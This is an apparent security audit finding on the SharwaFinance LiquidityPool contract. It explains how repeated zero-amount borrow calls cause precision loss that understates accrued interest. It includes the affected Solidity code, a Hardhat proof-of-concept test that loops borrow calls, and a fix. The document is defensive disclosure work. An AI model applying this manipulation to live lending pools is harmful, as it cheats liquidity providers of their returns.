---
# Core Classification
protocol: Sharwafinance
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 36484
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/SharwaFinance-security-review.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[M-04] Liquidity pool interest accrual can be manipulated

### Overview


This bug report discusses an issue with the `LiquidityPool` contract where frequent calls to the `borrow` method can cause a precision loss in the calculation of the pool's interest. This can be exploited by an adversary to manipulate the pool's interest accrual, resulting in a reduction of the interest amount for borrowers and griefing for pool providers. The report includes a proof of concept test case to reproduce this issue and recommends implementing a `require` statement to prevent zero amount calls to the `borrow` method.

### Original Finding Content

**Severity**

**Impact:** Medium

**Likelihood:** Medium

**Description**

On each call to the `borrow` method of the `LiquidityPool` contract, the subsequent `_fixAccruedInterest` method is invoked which updates the `totalBorrowsSnapshotTimestamp` to the current `block.timestamp`. In case of frequent calls, this causes the `ownershipTime` in the `totalBorrows` method to have a low value (worst case: 1) which in turn leads to a precision loss in the final `totalBorrows` / interest snapshot computation. Therefore, the resulting pool interest is understated.

An adversary could abuse the above behavior by frequently invoking the `borrow` method, through the `MarginTrading` contract, with a zero amount to manipulate the pool's interest accrual leading to the following impacts:

- When the adversary is also a borrower, a reduction of the interest amount to repay can be achieved. In case of a high borrow interest amount and due to the low transaction fees on L2, this can be profitable.
- Pool providers can be griefed by denying them their expected return on investment due to the reduced interest.

```solidity
function totalBorrows() public view returns (uint) {
    uint ownershipTime = block.timestamp - totalBorrowsSnapshotTimestamp;  // @audit is 1 in worst case on repeated calls
    uint precision = 10 ** 18;
    UD60x18 temp = div(
        convert(
            ((INTEREST_RATE_COEFFICIENT + interestRate) *
                precision) / INTEREST_RATE_COEFFICIENT
        ),
        convert(precision)
    );
    return
        ((netDebt + totalInterestSnapshot) *
            intoUint256(pow(temp, div(convert(ownershipTime), convert(ONE_YEAR_SECONDS))))) / 1e18;  // @audit precision loss on low 'ownershipTime' and final division by 1e18
}

function _fixAccruedInterest() private returns (uint) {
    uint newTotalBorrows = totalBorrows();  // @audit updates with understated value in case of lost precision
    totalInterestSnapshot = newTotalBorrows - netDebt;
    totalBorrowsSnapshotTimestamp = block.timestamp;
    return newTotalBorrows;
}
```

**Proof of Concept**

Please add the following test case to `liquidity_pool.spec.ts` in order to reproduce the above interest manipulation attack.

```typescript
it.only("Expect interest to be correctly accrued despite repeated calls to borrow with zero amount", async function () {
  await USDC.connect(firstInvestor).transfer(
    await marginTrading.getAddress(),
    ethers.parseUnits("50", 6)
  );

  // Investor provides 3000 USDC to pool
  const amountFirstInvestor = ethers.parseUnits("3000", 6);
  await USDC.connect(firstInvestor).approve(
    liquidityPoolUSDC.getAddress(),
    amountFirstInvestor
  );
  await liquidityPoolUSDC.connect(firstInvestor).provide(amountFirstInvestor);

  // Trader borrows 1000 USDC
  const firstTraderDebtAmount = ethers.parseUnits("1000", 6);
  await marginTrading
    .connect(firstTrader)
    .borrow(ethers.parseUnits("1", 0), firstTraderDebtAmount);

  const timeBefore = await time.latest();
  // OK case: Wait 1h
  // await time.increaseTo(await time.latest() + 60 * 60);
  // .. or ..
  // Manipulated case: Trader borrows with zero amount for 1h
  for (let i = 0; i < 60 * 60; i++) {
    await marginTrading
      .connect(firstTrader)
      .borrow(ethers.parseUnits("1", 0), 0);
  }
  const timeAfter = await time.latest();
  // Benchmark elapsed time to make sure both cases take equally long
  console.log(timeAfter - timeBefore);

  // Trader repays entire debt
  const returnAmount = await liquidityPoolUSDC.getDebtWithAccruedInterestOnTime(
    ethers.parseUnits("1", 0),
    (await time.latest()) + 1
  );
  await marginTrading.connect(firstTrader).repay(
    ethers.parseUnits("1", 0),
    returnAmount, // repayment of the entire debt, it is expected that MarginTrading will independently call this function
    await USDC.getAddress(),
    returnAmount
  );

  // Expect interest to be correctly accrued
  const accruedInterest = returnAmount - firstTraderDebtAmount;
  expect(accruedInterest).to.equal(ethers.parseUnits("5571", 0));
});
```

This test case is intended to fail in order to reveal the resulting reduction of accrued interest by ~35% when compared to the expected behavior.

**Recommendations**

It is suggested to `require` non-zero amounts in the `borrow` method to reduce the economical feasibility of the preset attack vector.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Sharwafinance |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/SharwaFinance-security-review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

